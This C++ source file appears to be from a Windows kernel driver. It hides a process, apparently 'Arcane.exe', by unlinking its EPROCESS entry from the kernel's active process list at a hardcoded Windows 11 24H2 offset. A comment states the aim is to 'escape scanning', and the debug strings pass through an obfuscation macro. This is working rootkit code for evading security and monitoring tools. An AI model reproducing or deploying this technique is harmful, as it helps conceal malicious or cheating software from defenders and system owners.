#include "DetachEprocess.hpp"

void DetachEprocess::remove_from_process_links(PEPROCESS process)
{
	if (!process) {
		return;
	}
	
	// Works on windows 11 24h2 and later
	// TODO: do versioning and imlum
	PLIST_ENTRY activeProcessLinks = (PLIST_ENTRY)((PUCHAR)process + 0x1d8);
	DEBUG_PRINT_OBFUSCATE("ActiveProcessLinks: ");
	DEBUG_PRINT("%p\n", activeProcessLinks);
	DEBUG_PRINT_OBFUSCATE("Flink: ");
	DEBUG_PRINT("%p\n", activeProcessLinks->Flink);
	DEBUG_PRINT_OBFUSCATE("Blink: ");
	DEBUG_PRINT("%p\n", activeProcessLinks->Blink);
	
	// Removing flink and blink references to escape scanning
	RemoveEntryList(activeProcessLinks);
	activeProcessLinks->Flink = activeProcessLinks;
	activeProcessLinks->Blink = activeProcessLinks;

	DEBUG_PRINT_OBFUSCATE("Detached Arcane.exe from the PsActiveProcessHead!");
}